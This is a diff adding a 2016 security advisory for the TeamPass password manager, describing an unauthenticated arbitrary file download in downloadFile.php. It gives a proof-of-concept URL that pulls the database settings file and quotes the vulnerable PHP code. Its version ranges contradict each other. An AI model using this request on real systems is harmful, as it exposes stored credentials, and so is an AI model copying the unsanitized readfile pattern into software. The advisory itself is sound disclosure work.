@@ -1,0 +1,66 @@
+1. ADVISORY INFORMATION
+========================================
+Title: TeamPass Passwords Management System via Unauth File Download and Arbitrary File Download
+Application: TeamPass Passwords Management System
+Class: Sensitive Information disclosure
+Remotely Exploitable: Yes
+Versions Affected: TeamPass Passwords Management System <= 2.1.26
+Bugs:  Arbitrary File Download
+Date of found:  21.03.2016
+Reported:  09.05.2016
+Date of Public Advisory: 13.05.2016
+Author: Hasan Emre Ozer 
+
+
+2. CREDIT
+========================================
+This vulnerability was identified during penetration test
+by Hasan Emre Ozer & Halit Alptekin from PRODAFT / INVICTUS
+
+Thank you Mehmet Ince for support
+
+3. DESCRIPTION
+========================================
+We deciced to publish the vulnerability after its fix in release 2.1.26
+
+4. VERSIONS AFFECTED
+========================================
+TeamPass Passwords Management System <= 2.1.10
+
+
+5. TECHNICAL DETAILS & POC
+========================================
+Using 'downloadFile.php' file from 'sources' directory we can download any file.
+
+
+Proof of Concept (POC)
+ 
+Example for downloading database configuration:
+ 
+http://teampass/sources/downloadFile.php?sub=includes&file=settings.php
+
+
+Technical Details
+<?php 
+......
+
+header("Content-disposition: attachment; filename=".rawurldecode($_GET['name']));
+header("Content-Type: application/octet-stream");
+header("Pragma: public");
+header("Cache-Control: must-revalidate, post-check=0, pre-check=0, public");
+header("Expires: 0");
+readfile('../'.$_GET['sub'].'/'.basename($_GET['file']));
+?>
+
+$_GET['sub'] and $_GET['file'] parameters vulnerable in readfile function. 
+
+
+
+6. SOLUTION
+========================================
+Update to the latest version v2.1.26
+
+
+7. REFERENCES
+========================================
+http://teampass.net/2016-05-13-release-2.1.26
